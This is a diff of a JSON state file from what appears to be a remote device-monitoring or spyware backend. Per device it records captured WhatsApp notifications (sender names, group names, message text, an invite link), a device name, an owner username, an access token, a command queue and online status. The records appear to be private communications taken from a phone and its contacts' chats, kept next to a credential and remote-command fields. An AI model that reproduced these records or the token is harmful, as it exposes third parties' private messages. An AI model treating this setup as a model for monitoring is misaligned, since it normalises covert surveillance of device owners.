@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎1491 pesan dari 19 chat",
+        "time": "29/04 21:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777468996460
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝙹𝚋¹ 𝚊𝚕𝚕 𝚐𝚊𝚖𝚎 || 𝚙𝚒𝚝𝚎𝚗𝚎𝚜𝚜 x fyd (388 pesan): ~ Tanz🥷🇦🇱🦅",
         "content": "بِسۡـــــــــمِ ٱللهِ ٱلرَحۡـمَـٰنِ ٱلرَحِـــــــيم\n𝐔𝐁𝐔𝐑-𝐔𝐁𝐔𝐑 𝐈𝐊𝐀𝐍 𝐋𝐄𝐋𝐄\n𝐉𝐎𝐈𝐍 𝐃𝐎𝐍𝐆 https://chat.whatsapp.com/GjVnNh90v2XCF1DPxIxJyq\nbantu join mas yang join rejeki nya lancar otw pemes bismillah semoga bisa\nbantu join mas yang join rejeki nya lancar otw pemes bismillah semoga bisa",
         "time": "29/04 21:34",
@@ -4011,14 +4019,6 @@
         "time": "29/04 21:25",
         "pkg": "com.whatsapp",
         "receivedAt": 1777468450319
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (200 pesan): ~ 𝙏𝙞𝙧𝙯͛𝙠𝙪𝙮𝙮",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "29/04 21:25",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777468450279
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777468992614,
+    "lastSeen": 1777468995749,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
